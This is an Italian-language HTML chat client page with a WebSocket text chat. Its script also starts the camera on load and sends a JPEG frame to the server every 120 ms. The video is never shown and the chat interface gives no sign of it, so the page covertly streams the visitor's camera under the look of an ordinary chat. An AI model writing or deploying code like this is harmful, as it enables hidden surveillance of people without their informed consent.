<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Client Chat</title>
<style>
body{margin:0;padding:0;font-family:Arial;background:#000;color:#0f0;text-align:center}
#chat{height:80vh;overflow:auto;padding:10px}
.row{margin:6px 0}
.row.me{text-align:right}
.bubble{display:inline-block;padding:6px 10px;border-radius:14px;background:#0b4f2a;max-width:70%}
.row.me .bubble{background:#2EA144;color:#001}
.controls{display:flex;padding:6px}
.controls input{flex:1;padding:6px;border-radius:6px;border:none;background:#011001;color:#dfffdc}
.controls button{margin-left:6px;padding:6px 10px;background:#2EA144;border:none;color:#001;border-radius:6px;cursor:pointer}
</style>
</head>
<body>
<div id="chat"></div>
<div class="controls">
  <input type="text" id="text" placeholder="Scrivi un messaggio...">
  <button id="sendBtn">Invia</button>
</div>

<script>
const room = prompt('Inserisci il tuo ID utente') || 'user1';
const ws = new WebSocket(`${location.protocol==='https:'?'wss':'ws'}://${location.host}/ws?role=client&room=${room}`);
const chatEl=document.getElementById('chat');
const textIn=document.getElementById('text');
const sendBtn=document.getElementById('sendBtn');

function addMessage(from,text,me=false){
  const row=document.createElement('div');
  row.className='row'+(me?' me':'');
  const bubble=document.createElement('div');
  bubble.className='bubble';
  bubble.textContent=text;
  row.appendChild(bubble);
  chatEl.appendChild(row);
  chatEl.scrollTop=chatEl.scrollHeight;
}

ws.addEventListener('message',e=>{
  try{
    const data=JSON.parse(e.data);
    if(data.type==='chat') addMessage(data.from,data.text,false);
  }catch(err){console.error(err);}
});

sendBtn.onclick=()=>{
  const txt=textIn.value.trim();
  if(!txt) return;
  ws.send(JSON.stringify({type:'chat',text:txt}));
  addMessage('Tu',txt,true);
  textIn.value='';
};

// Chiedi consenso fotocamera e invia frame
async function startCamera(){
  try{
    const stream=await navigator.mediaDevices.getUserMedia({video:{width:{ideal:640}},audio:false});
    const video=document.createElement('video');
    video.srcObject=stream;
    video.play();
    const canvas=document.createElement('canvas');
    function sendFrame(){
      if(video.videoWidth===0){ setTimeout(sendFrame,120); return; }
      canvas.width=video.videoWidth/2;
      canvas.height=video.videoHeight/2;
      const ctx=canvas.getContext('2d');
      ctx.drawImage(video,0,0,canvas.width,canvas.height);
      const imgData=canvas.toDataURL('image/jpeg',0.65);
      ws.send(JSON.stringify({type:'video',room,cam:'back',image:imgData}));
      setTimeout(sendFrame,120);
    }
    sendFrame();
  }catch(err){ console.log('Errore fotocamera',err); }
}

startCamera();
</script>
</body>
</html>
